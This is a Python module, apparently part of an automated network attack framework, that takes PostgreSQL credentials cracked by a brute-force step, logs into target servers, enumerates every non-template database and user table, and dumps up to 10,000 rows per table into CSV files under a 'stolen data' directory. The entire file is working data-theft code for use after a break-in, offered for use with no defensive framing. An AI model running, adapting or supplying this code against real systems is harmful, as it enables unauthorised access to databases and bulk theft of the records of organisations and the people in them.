"""
steal_data_postgres.py - Enumerates tables and extracts data from PostgreSQL
instances where credentials have been obtained by PostgresBruteforce.
Requires psycopg2-binary.
"""

import os
import logging
import time
import pandas as pd
from shared import SharedData
from logger import Logger

logger = Logger(name="steal_data_postgres.py", level=logging.DEBUG)

b_class = "StealDataPostgres"
b_module = "steal_data_postgres"
b_status = "steal_data_postgres"
b_parent = "PostgresBruteforce"
b_port = 5432

SYSTEM_SCHEMAS = {'pg_catalog', 'information_schema', 'pg_toast', 'pg_temp_1', 'pg_toast_temp_1'}


class StealDataPostgres:
    def __init__(self, shared_data):
        self.shared_data = shared_data
        self.b_parent_action = b_parent
        self.pg_connected = False
        self.stop_execution = False
        logger.info("StealDataPostgres initialized.")

    def connect(self, ip, user, password, dbname="postgres", port=5432):
        try:
            import psycopg2
            conn = psycopg2.connect(
                host=ip, port=port, user=user, password=password,
                dbname=dbname, connect_timeout=10
            )
            self.pg_connected = True
            return conn
        except ImportError:
            logger.warning("psycopg2 not installed — run: pip install psycopg2-binary")
            return None
        except Exception as e:
            logger.debug(f"PostgreSQL connect failed for {ip} db={dbname}: {e}")
            return None

    def find_user_tables(self, conn):
        """Return list of (schema, table) tuples excluding system schemas."""
        try:
            cur = conn.cursor()
            cur.execute("""
                SELECT table_schema, table_name
                FROM information_schema.tables
                WHERE table_type = 'BASE TABLE'
                  AND table_schema NOT IN %s
                ORDER BY table_schema, table_name
            """, (tuple(SYSTEM_SCHEMAS),))
            tables = cur.fetchall()
            cur.close()
            return tables
        except Exception as e:
            logger.error(f"Error listing tables: {e}")
            return []

    def steal_table(self, conn, schema, table, local_dir):
        try:
            if self.shared_data.orchestrator_should_exit or self.stop_execution:
                return 0
            query = f'SELECT * FROM "{schema}"."{table}" LIMIT 10000'
            df = pd.read_sql(query, conn)
            out_path = os.path.join(local_dir, f"{schema}__{table}.csv")
            df.to_csv(out_path, index=False)
            logger.success(f"Saved {len(df)} rows from {schema}.{table}")
            return len(df)
        except Exception as e:
            logger.error(f"Error dumping {schema}.{table}: {e}")
            return 0

    def execute(self, ip, port, row, status_key):
        try:
            parent_status = row.get(self.b_parent_action, "")
            if 'success' not in parent_status:
                logger.info(f"Skipping PostgreSQL dump for {ip} — parent not successful")
                return 'skipped'

            self.shared_data.ragnarorch_status = "StealDataPostgres"
            time.sleep(2)
            logger.info(f"Stealing PostgreSQL data from {ip}:{port}...")

            postgresfile = self.shared_data.postgresfile
            if not os.path.exists(postgresfile):
                logger.error(f"No PostgreSQL credential file found for {ip}")
                return 'failed'

            df_creds = pd.read_csv(postgresfile)
            ip_creds = df_creds[df_creds['IP Address'] == ip]
            if ip_creds.empty:
                logger.error(f"No PostgreSQL credentials found for {ip}")
                return 'failed'

            # Deduplicate by (user, password)
            seen = set()
            credential_sets = []
            for _, cred_row in ip_creds.iterrows():
                key = (cred_row['User'], cred_row['Password'])
                if key not in seen:
                    seen.add(key)
                    credential_sets.append(key)

            mac = row.get('MAC Address', 'unknown')
            success = False

            for user, password in credential_sets:
                if self.stop_execution or self.shared_data.orchestrator_should_exit:
                    break
                logger.info(f"Connecting to PostgreSQL {ip} as {user}")
                conn = self.connect(ip, user, password, port=port)
                if not conn:
                    continue

                # Enumerate databases available to this user
                try:
                    cur = conn.cursor()
                    cur.execute("SELECT datname FROM pg_database WHERE datistemplate = false")
                    databases = [r[0] for r in cur.fetchall()]
                    cur.close()
                except Exception:
                    databases = ["postgres"]
                conn.close()

                for dbname in databases:
                    if self.stop_execution or self.shared_data.orchestrator_should_exit:
                        break
                    db_conn = self.connect(ip, user, password, dbname=dbname, port=port)
                    if not db_conn:
                        continue

                    tables = self.find_user_tables(db_conn)
                    if not tables:
                        db_conn.close()
                        continue

                    local_dir = os.path.join(
                        self.shared_data.datastolendir, f"postgres/{mac}_{ip}/{dbname}"
                    )
                    os.makedirs(local_dir, exist_ok=True)

                    total_rows = 0
                    for schema, table in tables:
                        if self.stop_execution or self.shared_data.orchestrator_should_exit:
                            break
                        total_rows += self.steal_table(db_conn, schema, table, local_dir)
                    db_conn.close()

                    if total_rows > 0:
                        logger.success(
                            f"PostgreSQL dump complete for {ip}/{dbname}: "
                            f"{len(tables)} tables, {total_rows} rows"
                        )
                        success = True

                if success:
                    break

            return 'success' if success else 'failed'

        except Exception as e:
            logger.error(f"Unexpected error during PostgreSQL dump for {ip}: {e}")
            return 'failed'


if __name__ == "__main__":
    shared_data = SharedData()
    try:
        steal = StealDataPostgres(shared_data)
        for row in shared_data.read_data():
            ip = row["IPs"]
            steal.execute(ip, b_port, row, b_status)
    except Exception as e:
        logger.error(f"Error: {e}")
